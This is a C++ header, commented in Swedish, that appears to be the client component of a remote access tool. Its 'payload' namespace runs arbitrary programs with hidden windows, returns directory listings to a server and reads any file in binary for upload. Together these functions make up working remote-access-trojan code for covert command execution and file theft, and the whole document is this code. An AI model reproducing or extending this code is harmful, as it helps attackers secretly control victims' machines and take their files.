#pragma once
#include "precompile.h"
#include "process.h"
#include "directory.h"

namespace helper { // olika hjälp funktioner till klienten
	void send_directory(tcp_client c, std::vector<dir_item> items) {
		c.send({ "dir_status", std::to_string(items.size()) }); // skicka antal element i mappen
		for (auto [item, size] : items) {
			message msg{ "filedescription", item.string() + "|" + std::to_string(size) }; // skapa meddelande med fil namn och storlek
			c.send(msg);
			std::cout << "send()[" << msg.buffer() << "] - " << Error(0)<< std::endl;
		}
	}
	std::pair<std::string, std::string> ArgSplit(std::string args, char delimit) { // splitar en sträng vid mellanslaget till en std::pair

		auto found = args.find_first_of(delimit); // försök hitta första separeringen

		if (found != std::string::npos) { // om lyckats
			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
		}
		else { // annars retunera bara det självstående argumentet
			return { args, "" };
		}
	}
}

namespace payload { // payload funktioner som används för att utföra någonting på klienten tex starta en process ta reda på vem som är inloggad

	bool process_execution(std::string program, bool hide) {
		STARTUPINFOA info = { sizeof(info) }; 
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		
		// om processen ska gömmas så göm
		if (hide) { 
			info.wShowWindow = SW_HIDE;
		}
		else {
			info.wShowWindow = SW_NORMAL;
		}
		//skapa process
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
		{
			return false;
		}
		else {
			// för att undvika handle läcka
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	// om processen ska skapas gömd
	std::string process_execution_hidden(std::string program) {
		if (!process_execution(program, true))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}

	// om processen ska skapas visande
	std::string process_execution_show(std::string program) {
		if (!process_execution(program, false))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}
	// om man vill ladda ner en fil från klienten till servern
	std::string download_file(std::string program) {
		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program) && std::filesystem::file_size(program) > 0) { // om filen exsiterar och inte är en mapp
			std::ifstream file(program, std::ios::binary); // läs in filen binärt
			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en sträng med itrator konstruktion
		}
		else {
			return "FAIL";
		}
	}

	
}

